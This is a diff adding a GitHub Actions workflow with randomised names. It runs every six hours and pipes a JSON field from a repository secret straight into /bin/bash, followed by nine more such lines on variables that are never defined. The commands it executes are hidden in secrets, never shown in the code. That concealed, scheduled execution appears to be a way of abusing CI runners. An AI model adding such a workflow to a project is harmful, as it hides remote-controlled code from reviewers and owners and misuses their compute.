@@ -1,0 +1,26 @@
+name: escapehoodlum
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: escapehoodlum
+        env:
+          pqa0321: ${{ secrets.pqa0321 }}
+        run: |
+          echo $pqa0321 | jq -r .xuugl474 | /bin/bash
+          echo $fcx7 | jq -r .m0 | /bin/bash
+          echo $hc14 | jq -r .wrt42 | /bin/bash
+          echo $rxq35 | jq -r .hd477 | /bin/bash
+          echo $jxqe2601 | jq -r .itjl28 | /bin/bash
+          echo $bnlz755 | jq -r .nnz875 | /bin/bash
+          echo $gpzov63882 | jq -r .e278 | /bin/bash
+          echo $hn1 | jq -r .tn64 | /bin/bash
+          echo $yktiw22 | jq -r .poip8 | /bin/bash
+          echo $r7299 | jq -r .cnfuj3 | /bin/bash
+
